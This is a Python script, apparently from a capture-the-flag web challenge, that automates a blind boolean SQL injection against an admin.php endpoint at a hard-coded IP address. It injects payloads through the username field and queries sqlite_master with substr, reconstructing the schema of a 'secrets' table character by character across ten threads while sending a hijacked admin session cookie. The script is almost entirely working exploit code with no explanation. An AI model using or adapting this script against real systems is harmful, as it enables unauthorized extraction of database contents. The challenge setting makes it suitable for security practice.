## scripts for Web Challenges (Unseen Path to secrets)
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://34.18.12.84:8086/admin.php?action=check"
session_cookie = "<Admin_sessionID>" # replace with your sessionid

# Characters to brute-force
charset = string.ascii_letters + string.digits + "_{}()-=, "

# Set up headers
headers = {
    "Host": "34.18.12.84:8086",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "http://34.18.12.84:8086",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Referer": "http://34.18.12.84:8086/admin.php?action=check",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": f"PHPSESSID={session_cookie}",
    "Connection": "close"
}

# Function to brute-force a single position
def brute_force_position(pos):
    for char in charset:
        payload = f"' OR '{char}' IN (SELECT substr(sql,{pos+1},1) FROM sqlite_master WHERE name GLOB 'secrets') --"
        data = {"action": "check", "username": payload}
        try:
            resp = requests.post(url, headers=headers, data=data, timeout=5)
            if "active" in resp.text.lower():
                print(f"[+] Position {pos}: '{char}'")
                return pos, char
        except Exception as e:
            pass
    print(f"[-] Position {pos}: No match found")
    return pos, ''

# Launch multithreaded brute-force
print("Starting multithreaded brute-force on `sqlite_master.sql`...")
results = {}
with ThreadPoolExecutor(max_workers=10) as executor:
    future_to_pos = {executor.submit(brute_force_position, pos): pos for pos in range(38)}
    for future in as_completed(future_to_pos):
        pos, char = future.result()
        results[pos] = char

# Sort results and reconstruct SQL
sql_string = ''.join(results.get(i, '?') for i in range(max(results.keys())+1))
print("\n[+] Reconstructed SQL:")
print(sql_string)
